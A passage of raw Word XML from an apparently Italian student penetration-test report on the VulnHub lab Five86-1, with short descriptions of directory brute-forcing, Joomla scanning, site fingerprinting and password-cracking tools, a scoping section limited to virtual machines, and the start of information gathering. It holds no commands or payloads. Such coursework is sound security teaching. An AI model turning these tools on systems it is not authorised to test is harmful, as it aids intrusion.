          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00A82052">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A82052" w:rsidRPr="00A82052">
        <w:t>Progettata per effettuare</w:t>
      </w:r>
      <w:r w:rsidR="00A82052">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007C7871">
        <w:t xml:space="preserve">le </w:t>
      </w:r>
      <w:r w:rsidR="007C7871" w:rsidRPr="007C7871">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>brute</w:t>
      </w:r>
      <w:r w:rsidR="00A82052" w:rsidRPr="00A82052">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> force</w:t>
      </w:r>
      <w:r w:rsidR="00A82052" w:rsidRPr="00A82052">
        <w:t xml:space="preserve"> di </w:t>
      </w:r>
      <w:r w:rsidR="00A82052" w:rsidRPr="00A82052">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>directory</w:t>
      </w:r>
      <w:r w:rsidR="00A82052" w:rsidRPr="00A82052">
        <w:t xml:space="preserve"> e nomi di file su </w:t>
      </w:r>
      <w:r w:rsidR="00A82052" w:rsidRPr="00A82052">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Web Server</w:t>
      </w:r>
      <w:r w:rsidR="00A82052" w:rsidRPr="00A82052">
        <w:t xml:space="preserve"> sia nascosti che </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00A82052" w:rsidRPr="00A82052">
        <w:t>non</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00A82052" w:rsidRPr="00A82052">
        <w:t xml:space="preserve">. L’efficienza è legata al dizionario che usa per effettuare </w:t>
      </w:r>
      <w:r w:rsidR="007C7871" w:rsidRPr="00A82052">
        <w:t xml:space="preserve">le </w:t>
      </w:r>
      <w:r w:rsidR="007C7871" w:rsidRPr="007C7871">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>brute</w:t>
      </w:r>
      <w:r w:rsidR="00A82052" w:rsidRPr="00A82052">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> force.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1991CA36" w14:textId="77777777" w:rsidR="00B703BF" w:rsidRDefault="00B703BF" w:rsidP="00A82052"/>
    <w:p w14:paraId="77DA6F87" w14:textId="120BEF11" w:rsidR="00B703BF" w:rsidRDefault="00B703BF" w:rsidP="00B703BF">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc139378609"/>
      <w:r>
        <w:t>2.1</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703BF">
        <w:t>OWASP JoomScan</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w14:paraId="4E635C92" w14:textId="77777777" w:rsidR="00B703BF" w:rsidRDefault="00B703BF" w:rsidP="00B703BF">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>IoomScan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> è uno </w:t>
      </w:r>
      <w:r w:rsidRPr="007C7871">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">tool </w:t>
      </w:r>
      <w:r w:rsidRPr="007C7871">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Open Source</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">, implementato in linguaggio </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007C7871">
        <w:t>Perl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B703BF">
        <w:rPr>
          <w:rFonts w:ascii="Calibri-Italic" w:eastAsia="Times New Roman" w:hAnsi="Calibri-Italic" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ed appartenente al</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>progetto OWASP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703BF">
        <w:t>Consente di</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B4ED5C" w14:textId="6E6C5E1C" w:rsidR="00B703BF" w:rsidRPr="00B703BF" w:rsidRDefault="00B703BF">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Automatizzare la rilevazione delle vulnerabilità nelle implementazioni del </w:t>
      </w:r>
      <w:r w:rsidRPr="007C7871">
        <w:t>CMS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">(Content Management System) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Joomla</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1BA31284" w14:textId="344FFF8B" w:rsidR="00B703BF" w:rsidRPr="00B703BF" w:rsidRDefault="00B703BF">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Rilevare configurazioni errate e carenze a livello di amministrazione dei servizi (ad es., password deboli) offerti da </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703BF">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Joomla</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="32D6D28E" w14:textId="77777777" w:rsidR="00D91D1F" w:rsidRDefault="00D91D1F" w:rsidP="00A82052">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FE9B3B1" w14:textId="02CF34D2" w:rsidR="00D91D1F" w:rsidRDefault="009530C8" w:rsidP="009530C8">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc139378610"/>
      <w:r>
        <w:t>2.1</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> DIRSEARCH</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w14:paraId="08408380" w14:textId="71DA9B58" w:rsidR="009530C8" w:rsidRDefault="009530C8" w:rsidP="009530C8">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009530C8">
        <w:t>Dirsearch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009530C8">
        <w:rPr>
          <w:rFonts w:ascii="SFBX1000" w:hAnsi="SFBX1000"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009530C8">
        <w:t>è uno strumento progettato per forzare directory e file nei server web.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009530C8">
        <w:t xml:space="preserve">Essendo uno strumento ricco di funzionalità, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007C7871">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>dirsearch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009530C8">
        <w:t xml:space="preserve"> offre agli utenti l’opportunità di</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009530C8">
        <w:t>eseguire una complessa ricerca di contenuti web, con molti vettori per l’elenco di parole,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009530C8">
        <w:t>un’elevata precisione, ottime prestazioni, impostazioni avanzate di</w:t>
      </w:r>
      <w:r w:rsidR="007C7871">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009530C8">
        <w:t>connessione/richiesta, moderne tecniche di forza bruta e un output facilmente leggibile.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19467CE6" w14:textId="77777777" w:rsidR="009530C8" w:rsidRDefault="009530C8" w:rsidP="009530C8"/>
    <w:p w14:paraId="6410E193" w14:textId="7EBBF560" w:rsidR="009530C8" w:rsidRPr="00AF2CF9" w:rsidRDefault="009530C8" w:rsidP="009530C8">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc139378611"/>
      <w:r w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2.1</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> WHATWEB</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="6F3EDF38" w14:textId="13E8AD0A" w:rsidR="009530C8" w:rsidRDefault="009530C8" w:rsidP="009530C8">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>WhatWeb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>identifica</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>siti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AF2CF9">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> web. </w:t>
      </w:r>
      <w:r w:rsidRPr="009530C8">
        <w:t xml:space="preserve">Il suo obiettivo è rispondere alla domanda "Che cos’è quel sito web?". </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009530C8">
        <w:t>WhatWeb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009530C8">
        <w:t xml:space="preserve"> riconosce le tecnologie web, compresi i sistemi di gestione dei contenuti (CMS), le piattaforme di blogging, i pacchetti statistici/analitici, le librerie JavaScript, i server web e i dispositivi incorporati. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009530C8">
        <w:t>WhatWeb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009530C8">
        <w:t xml:space="preserve"> dispone di oltre 1800 plugin, ognuno dei quali riconosce qualcosa di diverso. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009530C8">
        <w:t>WhatWeb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009530C8">
        <w:t xml:space="preserve"> identifica anche</w:t>
      </w:r>
      <w:r w:rsidR="005F5985">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="009530C8">
        <w:t xml:space="preserve"> numeri di versione, indirizzi e-mail, ID di account, moduli di framework web, errori SQL e altro ancora.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324B1712" w14:textId="77777777" w:rsidR="000A5C5D" w:rsidRDefault="000A5C5D" w:rsidP="009530C8"/>
    <w:p w14:paraId="5487A543" w14:textId="165CB741" w:rsidR="000A5C5D" w:rsidRDefault="000A5C5D" w:rsidP="000A5C5D">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc139378612"/>
      <w:r>
        <w:t>2.1</w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> JOHN</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="4CA30AA9" w14:textId="714006F1" w:rsidR="000A5C5D" w:rsidRPr="009530C8" w:rsidRDefault="000A5C5D" w:rsidP="000A5C5D">
      <w:r w:rsidRPr="005F5985">
        <w:t>John the ripper</w:t>
      </w:r>
      <w:r w:rsidRPr="000A5C5D">
        <w:rPr>
          <w:rFonts w:ascii="SFBX1000" w:hAnsi="SFBX1000"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000A5C5D">
        <w:t xml:space="preserve">è uno strumento che può essere utilizzato per effettuare il </w:t>
      </w:r>
      <w:r w:rsidRPr="005F5985">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>cracking</w:t>
      </w:r>
      <w:r w:rsidRPr="000A5C5D">
        <w:t xml:space="preserve"> delle </w:t>
      </w:r>
      <w:r w:rsidRPr="005F5985">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>password</w:t>
      </w:r>
      <w:r w:rsidRPr="000A5C5D">
        <w:t xml:space="preserve"> e per invertire </w:t>
      </w:r>
      <w:r w:rsidRPr="005F5985">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>hash</w:t>
      </w:r>
      <w:r w:rsidRPr="000A5C5D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC10A4F" w14:textId="77777777" w:rsidR="000A5C5D" w:rsidRDefault="000A5C5D" w:rsidP="00D91D1F">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49561A2A" w14:textId="77777777" w:rsidR="000A5C5D" w:rsidRPr="000A5C5D" w:rsidRDefault="000A5C5D" w:rsidP="000A5C5D"/>
    <w:p w14:paraId="49D0CD5F" w14:textId="53EF4D90" w:rsidR="00D91D1F" w:rsidRPr="00807495" w:rsidRDefault="00D91D1F" w:rsidP="00D91D1F">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc139378613"/>
      <w:r w:rsidRPr="00807495">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">3 Target </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00807495">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Scoping</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="12F45FDF" w14:textId="0F6AC8D7" w:rsidR="00D91D1F" w:rsidRPr="00D91D1F" w:rsidRDefault="00D91D1F" w:rsidP="00D91D1F">
      <w:r w:rsidRPr="00D91D1F">
        <w:t>Questa è la fase di accordo tra due o più parti, ed è un'attività comparativa piuttosto che tecnica. Tutti i partecipanti coinvolti nel test interagiscono tra loro per determinare cosa fare, cosa analizzare</w:t>
      </w:r>
      <w:r>
        <w:t>. Valutare</w:t>
      </w:r>
      <w:r w:rsidRPr="00D91D1F">
        <w:t xml:space="preserve"> quali componenti e come procedere, quali azioni sono concesse, eventuali vincoli dovuti alle risorse (tempo/denaro), </w:t>
      </w:r>
      <w:r w:rsidR="00083AF2">
        <w:t>etc</w:t>
      </w:r>
      <w:r w:rsidRPr="00D91D1F">
        <w:t xml:space="preserve">. Nelle attività svolte, l'ambito di analisi è limitato alle macchine virtuali. I test condotti saranno del tipo </w:t>
      </w:r>
      <w:r w:rsidRPr="005F5985">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>black box</w:t>
      </w:r>
      <w:r w:rsidRPr="00D91D1F">
        <w:t xml:space="preserve"> e, oltre a questo documento, genereranno un dettagliato rapporto di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D91D1F">
        <w:t>penetration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D91D1F">
        <w:t xml:space="preserve"> test che verrà fornito al docente del corso in formato digitale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C89BA3" w14:textId="77777777" w:rsidR="00A82052" w:rsidRDefault="00A82052" w:rsidP="00A82052"/>
    <w:p w14:paraId="764DC34F" w14:textId="57C27F69" w:rsidR="00B239BB" w:rsidRPr="00382C67" w:rsidRDefault="002E0F60" w:rsidP="002E0F60">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc139378614"/>
      <w:r w:rsidRPr="00382C67">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">4 Information </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00382C67">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Gathering</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="74CF1A56" w14:textId="38BFCA0B" w:rsidR="002E0F60" w:rsidRDefault="00382C67" w:rsidP="002E0F60">
      <w:r w:rsidRPr="00382C67">
        <w:t xml:space="preserve">La fase di </w:t>
      </w:r>
      <w:r w:rsidRPr="00382C67">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Information </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00382C67">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Gathering</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00382C67">
        <w:t xml:space="preserve">, nota anche come </w:t>
      </w:r>
      <w:r w:rsidRPr="00382C67">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Finger printing</w:t>
      </w:r>
      <w:r w:rsidRPr="00382C67">
        <w:t xml:space="preserve">, è la fase di raccolta delle informazioni, la maggior parte delle quali si basa sul concetto di </w:t>
      </w:r>
      <w:r w:rsidRPr="00382C67">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Open Source Intelligence (OSINT)</w:t>
      </w:r>
      <w:r w:rsidRPr="00382C67">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>la</w:t>
      </w:r>
      <w:r w:rsidRPr="00382C67">
        <w:t xml:space="preserve"> ricerca </w:t>
      </w:r>
      <w:r>
        <w:t>di</w:t>
      </w:r>
      <w:r w:rsidRPr="00382C67">
        <w:t xml:space="preserve"> tutte le informazioni disponibili pubblicamente e </w:t>
      </w:r>
      <w:r>
        <w:t>le quali</w:t>
      </w:r>
      <w:r w:rsidRPr="00382C67">
        <w:t xml:space="preserve"> è necessario sapere. Durante l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">’attività </w:t>
      </w:r>
      <w:r w:rsidRPr="00382C67">
        <w:t xml:space="preserve">in corso, la fase di </w:t>
      </w:r>
      <w:r w:rsidRPr="00382C67">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Information </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00382C67">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Gathering</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00382C67">
        <w:t xml:space="preserve"> si è limitata alla raccolta di informazioni sulle pagine </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00382C67">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>VulnHub</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00382C67">
        <w:t xml:space="preserve"> pertinenti. Gli autori hanno fornito informazioni limitate, elencate di seguito</w:t>
      </w:r>
      <w:r w:rsidR="009644A6">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEC09DA" w14:textId="77777777" w:rsidR="009644A6" w:rsidRDefault="009644A6" w:rsidP="009644A6">
      <w:r>
        <w:t>Virtual Machine:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0532F647" w14:textId="77777777" w:rsidR="009644A6" w:rsidRDefault="009644A6">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009644A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Format</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="009644A6">
        <w:t>Virtual Machine (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009644A6">
        <w:t>Virtualbox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009644A6">
        <w:t xml:space="preserve"> - OVA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215261F6" w14:textId="7040E8E1" w:rsidR="009644A6" w:rsidRDefault="009644A6">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009644A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Operating System</w:t>
      </w:r>
      <w:r>
        <w:t>: Linux</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606EAFFC" w14:textId="77777777" w:rsidR="009644A6" w:rsidRDefault="009644A6" w:rsidP="009644A6">
      <w:r>
        <w:t>Networking:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A761D8" w14:textId="77777777" w:rsidR="009644A6" w:rsidRDefault="009644A6">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009644A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>DHCP service</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Enabled</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1259A46F" w14:textId="1FA1F7AD" w:rsidR="009644A6" w:rsidRDefault="009644A6">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009644A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">IP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009644A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>address</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Automatically</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>assign</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1E828488" w14:textId="6FF53B38" w:rsidR="009644A6" w:rsidRDefault="009644A6" w:rsidP="009644A6">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="161627FD" w14:textId="2F50EB01" w:rsidR="009644A6" w:rsidRDefault="009644A6" w:rsidP="00067544">
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Five86-1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> è un altro laboratorio vulnerabile appositamente costruito con l'intento di acquisire esperienza nel mondo dei test di penetrazione. L'obiettivo finale di questa sfida è radicarsi e leggere l'unica bandiera. Le competenze di </w:t>
      </w:r>
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Linux</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e la familiarità con la riga di comando di </w:t>
      </w:r>
      <w:r w:rsidRPr="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Linux</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sono</w:t>
      </w:r>
      <w:r w:rsidR="00067544">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
